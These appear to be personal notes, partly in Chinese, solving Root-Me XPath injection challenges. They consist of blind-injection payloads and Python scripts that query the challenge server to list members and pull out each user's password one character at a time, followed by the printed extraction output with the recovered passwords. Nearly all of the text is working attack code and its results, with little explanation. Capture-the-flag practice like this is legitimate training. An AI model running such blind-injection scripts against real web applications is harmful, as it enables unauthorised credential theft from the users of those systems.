
xpath
一般查询语句为:
//user[userid=5]/username='sdfsdfd',  在', // ,/ ，*号等字符被过滤的情况下，盲注可以用  string-length(username|password)测试长度，或者count(//user)==5测试用户数量  substring(password,1,1)测试字段的某位某个值
//user[userid=5]/username=''||//*||//[userid=5]/username=''

'1' = string('1')
'2'= string('2')

import requests
import string
url = 'http://challenge01.root-me.org/web-serveur/ch27/?action=members'
import re

def root_me_ch27(payload):
	list=[]
	for testchar in string.printable:
		Base = '&search='+ testchar+payload#"')]|//*|users[contians(.,'"
		response = requests.get(url+Base)

	#results = response.text.split('results')[-2][-2]
		results = re.findall("<li>(.*)</li>",response.text)
	#print(results)
		if len(results) >0:
			for user in results:
				if user not in list:
					list.append(user)
				#print('[+]: Found user: ', user)

					if 'administrator' in user:
						result = '[+]: Done!, Found administrator: '+user.split('<li>')[-3].split('</li>')[-2]
						return(result)
			
print(root_me_ch27("')]|//*|users[contians(.,'"))

url = "http://challenge01.root-me.org/web-serveur/ch24/?action=members"
response = requests.get(url)
chardic={}
i=1
for lists in response.text.split('><'):
	if '@' in lists:
		result = re.findall('td>(.*)</td',lists)[0]
		print(result)

		for char in result:
			if chardic.__contains__(char) == False:
				chardic[char]='substring(//user[userid={}]/email,{},1)'.format(i,result.index(char)+1)
				print(char,':',chardic[char])
		i+=1
for char in string.digits:
	chardic[char] = 'string({})'.format(char)

print(''.join(chardic.keys()))

url = 'http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid='


users =[]
for j in range(5):
	for length in range(5,30):
		out = requests.get(url+"{}+and+string-length(password)={}".format((j+1),length))
		if "XPath error" not in out.text:
			print("userid ={} ,password length is {}".format(j+1,length))
			users.append(length)
			print(users[j])

for j in range(5):
	password=[]

	for i in range(users[j]):
		for char in chardic.keys():
			payload = 'substring(password,{},1)={}'.format(i+1,chardic[char])
			response = requests.get(url+"{}+and+".format(j+1)+payload)
			if "XPath error" not in response.text:
				password.append(char)							
		if(len(password)<i+1):
			password.append('?')	
		print("password is ",''.join(password))
	print("userid = {},password is: ".format(j+1),''.join(password))
	
	

results-----------------------------------------------
password is  t
password is  te
password is  tes
password is  test
password is  test4
password is  test45
password is  test456
userid = 1,password is:  test456
password is  ?
password is  ?e
password is  ?ei
password is  ?eiJ
password is  ?eiJ4
password is  ?eiJ4a
password is  ?eiJ4a6
password is  ?eiJ4a65
password is  ?eiJ4a65@
password is  ?eiJ4a65@1
password is  ?eiJ4a65@1.
password is  ?eiJ4a65@1.o
password is  ?eiJ4a65@1.o?
userid = 2,password is:  ?eiJ4a65@1.o?
password is  s
password is  s?
password is  s?y
password is  s?y7
password is  s?y78
password is  s?y785
password is  s?y7857
password is  s?y78578
password is  s?y785785
password is  s?y7857858
password is  s?y78578587
userid = 3,password is:  s?y78578587
password is  m
password is  mi
password is  min
password is  mind
password is  mind1
password is  mind12
password is  mind121
password is  mind1215
password is  mind12156
password is  mind121563
password is  mind1215634
password is  mind12156341
password is  mind121563415
password is  mind1215634156
password is  mind12156341562
password is  mind121563415623
userid = 4,password is:  mind121563415623
password is  5
password is  56
password is  564
password is  5645
password is  56457
password is  56457t
password is  56457to
password is  56457to?
password is  56457to?r
userid = 5,password is:  56457to?r



